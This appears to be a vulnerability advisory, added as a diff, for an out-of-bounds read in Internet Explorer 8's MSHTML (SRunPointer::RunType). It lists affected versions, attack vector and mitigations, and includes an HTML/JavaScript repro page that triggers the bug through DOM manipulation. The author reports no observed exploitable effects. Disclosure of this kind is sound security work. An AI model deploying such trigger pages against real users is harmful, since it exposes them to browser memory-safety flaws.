@@ -1,0 +1,78 @@
+1408D - MSIE 8 MSHTML SRunPointer::RunType OOB read
+=====================================
+
+Synopsis
+--------
+Some rather complex JavaScript DOM manipulation can cause MSIE to read beyond
+the end of an object.
+
+Known affected versions
+-----------------------
+  + MSIE 8
+
+Attack vectors
+--------------
+  * MSIE 8
+    
+    An attacker would need to get a target user to open a specially crafted
+    webpage.}}
+
+Mitigations
+-----------
+  * MSIE 8
+    
+    Disabling JavaScript should prevent an attacker from triggering the
+    vulnerable code path.
+
+Repro
+-----
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+  <head>
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge" />
+  <style>
+    position_fixed {  position: fixed; }
+    position_relative { position: relative;  }
+    float_left { float: left; }
+    complex { float: left; width: 100%; }
+    complex:first-line { clear: left; }
+  </style>
+  <script>
+    window.onload = function boom() {
+      oElement_float_left = document.createElement('float_left');
+      oElement_complex = document.createElement('complex');
+      oElement_position_fixed = document.createElement('position_fixed');
+      oElement_position_relative = document.createElement('position_relative');
+      oElement_table = document.createElement('table');
+      oElement_x = document.createElement('x');
+      oTextNode = document.createTextNode('x');
+      document.documentElement.appendChild(oElement_float_left);
+      oElement_float_left.appendChild(oElement_complex);
+      oElement_float_left.appendChild(oTextNode);
+      oElement_complex.appendChild(oElement_position_fixed);
+      oElement_complex.appendChild(oElement_position_relative);
+      oElement_complex.appendChild(oElement_table);
+      oElement_complex.appendChild(oElement_x);
+      setTimeout(function() {
+        oElement_x.setAttribute('class', 'x');
+        setTimeout(function() {
+          alert();
+          document.write(0);
+        }, 0);
+      }, 0);
+    }
+  </script>
+  </head>
+</html>
+
+Description
+-----------
+The issue requires rather complex manipulation of the DOM and results in
+reading a value immediately following an object. The lower three 3 bits of this
+value are returned by the function doing the reading, resulting in a return
+value in the range 0-7. After exhaustively skipping over the read AV and having
+that function return each value, no other side effects were noticed. For that
+reason I did not investigate further. I speculate that there may be subtle
+effects that I did not notice that allow exploitation in some form or other,
+hence I am submitting this issue for your viewing pleasure.
